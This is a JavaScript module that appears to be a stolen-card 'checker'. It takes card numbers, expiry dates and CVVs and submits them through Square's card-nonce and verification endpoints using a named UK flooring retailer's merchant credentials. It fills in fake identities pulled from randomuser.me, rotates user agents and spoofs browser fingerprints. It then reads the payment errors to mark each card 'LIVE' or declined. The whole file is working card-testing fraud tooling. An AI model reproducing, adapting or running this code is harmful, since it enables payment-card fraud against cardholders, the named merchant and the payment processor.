function getStr(string, start, end) {
  const str = string.split(start);
  if (str.length < 2) return '';
  return str[1].split(end)[0];
}

function randomInt(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}

const USER_AGENTS = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36',
];

function randomUA() {
  return USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)];
}

async function getRandomUser() {
  const res = await fetch('https://randomuser.me/api/1.2/?nat=us', { signal: AbortSignal.timeout(10000) });
  const data = await res.json();
  const u = data.results[0];
  return {
    name: u.name.first,
    last: u.name.last,
    email: u.email,
    street: u.location.street.name + ' ' + u.location.street.number,
    city: u.location.city,
    state: u.location.state,
    postcode: u.location.postcode?.toString() || '10001',
    phone: u.phone,
  };
}

export async function checkCardSquareup(card, month, year, cvv) {
  const ua = randomUA();
  const user = await getRandomUser();

  const _ts = Date.now() + '.' + randomInt(100, 999);
  const last4 = card.slice(-4);
  const bin = card.substring(0, 8);

  let typo = card[0];
  let typew = 'VI';
  if (typo === '5') typew = 'MC';
  else if (typo === '3') typew = 'AX';
  else if (typo === '6') typew = 'DI';

  let expMonth = parseInt(month);
  let expYear = year.length === 2 ? '20' + year : year;

  // Step 1: Create card nonce
  const nonceBody = JSON.stringify({
    client_id: 'sq0idp-44DdJoMjFy9fTcbhVfTDKw',
    location_id: 'YPRFA9B0NPNCZ',
    session_id: 'iKQpWCAj9kBXXgVvouaNVQoFi4A1rLkog7NchS_w4fKHwICY_rDRKz2n4bGbDUpzmAwUdjqvRjTrFot8IGI=',
    website_url: 'https://www.flooringhut.co.uk/',
    squarejs_version: '27d3bdf1bc',
    analytics_token: 'ZWSHAERBO5QMFU6ZPSURZB7GB47BPK2PATUZG3NJCS67RUOANO4NTXKRPQLI2KI2FDZ4IRULBFJYELZAA772YYWHKZDST5MH',
    card_data: {
      number: card,
      exp_month: expMonth,
      exp_year: expYear,
      cvv: cvv,
      billing_postal_code: 'AS959FF',
    },
  });

  const nonceRes = await fetch('https://pci-connect.squareup.com/v2/card-nonce?_=' + _ts + '&version=27d3bdf1bc', {
    method: 'POST',
    headers: {
      'authority': 'pci-connect.squareup.com',
      'accept': 'application/json',
      'accept-language': 'en-US,en;q=0.9',
      'content-type': 'application/json; charset=UTF-8',
      'origin': 'https://pci-connect.squareup.com',
      'referer': 'https://pci-connect.squareup.com/v2/iframe?type=main&app_id=sq0idp-44DdJoMjFy9fTcbhVfTDKw&host_name=www.flooringhut.co.uk&location_id=YPRFA9B0NPNCZ&version=27d3bdf1bc',
      'user-agent': ua,
      'x-js-id': 'undefined',
    },
    body: nonceBody,
    signal: AbortSignal.timeout(15000),
  });
  const nonceJson = await nonceRes.json();
  const cnon = nonceJson.card_nonce || '';
  if (!cnon) {
    return { status: 'REPROVADA', detalhes: 'SquareUp: falha ao gerar nonce' };
  }

  // Step 2: Get verification token
  const verifBody = JSON.stringify({
    browser_fingerprint_by_version: [
      {
        payload_json: JSON.stringify({
          components: {
            user_agent: ua,
            language: 'en-US',
            color_depth: 24,
            resolution: [1536, 864],
            available_resolution: [1474, 864],
            timezone_offset: -330,
          },
          fingerprint: '1HwmBLTVwj7rGt4Z3HBLnME6gqQFERWExR',
        }),
        payload_type: 'fingerprint-v1',
      },
    ],
  });

  const verifRes = await fetch('https://connect.squareup.com/v2/analytics/verifications', {
    method: 'POST',
    headers: {
      'authority': 'connect.squareup.com',
      'accept': '*/*',
      'accept-language': 'en-US,en;q=0.9',
      'content-type': 'application/json',
      'origin': 'https://connect.squareup.com',
      'referer': 'https://connect.squareup.com/payments/data/frame.html?referer=https%3A%2F%2Fwww.flooringhut.co.uk%2Fcheckout%2F%23payment',
      'user-agent': ua,
    },
    body: verifBody,
    signal: AbortSignal.timeout(15000),
  });
  const verifJson = await verifRes.json();
  const verf = verifJson.token || '';

  // Step 3: Submit payment
  const payBody = JSON.stringify({
    cartId: 'JYlC09CE5xz7gnAXcew75FQlOrScCFD8',
    billingAddress: {
      countryId: 'GB',
      regionCode: '',
      region: '',
      street: [user.street],
      company: '',
      telephone: user.phone,
      fax: '',
      postcode: user.postcode,
      city: user.city,
      firstname: user.name,
      lastname: user.last,
      saveInAddressBook: null,
    },
    paymentMethod: {
      method: 'squareup_payment',
      additional_data: {
        cc_cid: '',
        cc_ss_start_month: '',
        cc_ss_start_year: '',
        cc_ss_issue: '',
        cc_type: typew === 'VI' ? 'VISA' : typew === 'MC' ? 'MASTERCARD' : 'VISA',
        cc_exp_year: expYear.toString(),
        cc_exp_month: expMonth.toString(),
        cc_number: '',
        nonce: cnon,
        digital_wallet: 'NONE',
        cc_last_4: last4,
        buyerVerificationToken: verf,
        display_form: true,
      },
    },
    email: user.email,
  });

  const payRes = await fetch('https://www.flooringhut.co.uk/rest/fhdomestic/V1/guest-carts/fwiIbJjCkX80SP7H9iZJHPeKbHB6wAAa/payment-information', {
    method: 'POST',
    headers: {
      'authority': 'www.flooringhut.co.uk',
      'accept': '*/*',
      'accept-language': 'en-US,en;q=0.9',
      'content-type': 'application/json',
      'origin': 'https://www.flooringhut.co.uk',
      'referer': 'https://www.flooringhut.co.uk/checkout/',
      'user-agent': ua,
      'x-requested-with': 'XMLHttpRequest',
    },
    body: payBody,
    signal: AbortSignal.timeout(15000),
  });
  const payText = await payRes.text();

  // Analyze response
  if (payText.includes("Authorization error: 'ADDRESS_VERIFICATION_FAILURE'")) {
    return { status: 'LIVE', detalhes: 'CVV MATCHED (AVS failure)' };
  }
  if (payText.includes("Authorization error: 'CVV_FAILURE'")) {
    return { status: 'LIVE', detalhes: 'CCN MATCHED (CVV failure)' };
  }
  if (payText.includes("Authorization error: 'TRANSACTION_LIMIT'")) {
    return { status: 'LIVE', detalhes: 'CVV MATCHED (TRANSACTION_LIMIT)' };
  }
  if (payText.includes("Authorization error: 'GENERIC_DECLINE'")) {
    return { status: 'REPROVADA', detalhes: 'GENERIC_DECLINE - site cannot mass check' };
  }
  if (payText.includes('"error"') || payText.includes('"message"')) {
    try {
      const j = JSON.parse(payText);
      return { status: 'REPROVADA', detalhes: j.message || j.error || 'SquareUp declined' };
    } catch {}
  }
  return { status: 'REPROVADA', detalhes: 'DECLINED' };
}

function getBandeira(card) {
  const f = card[0];
  if (f === '4') return 'Visa';
  if (f === '5') return 'Mastercard';
  if (f === '3') return 'Amex';
  if (f === '6') return 'Discover';
  if (f === '2') return 'Elo';
  return 'Desconhecida';
}

export function formatSquareupResult(card, month, year, cvv, result) {
  const bin = card.substring(0, 6);
  const bandeira = getBandeira(card);
  const ccDisplay = card.substring(0, 4) + ' ' + card.substring(4, 8) + ' ' + card.substring(8, 12) + ' ' + card.substring(12);
  const isLive = result.status === 'LIVE';
  return {
    cc: ccDisplay,
    bin,
    bandeira,
    mes: month,
    ano: year,
    cvv,
    status: result.status,
    emoji: isLive ? '✅' : '❌',
    detalhes: result.detalhes,
  };
}
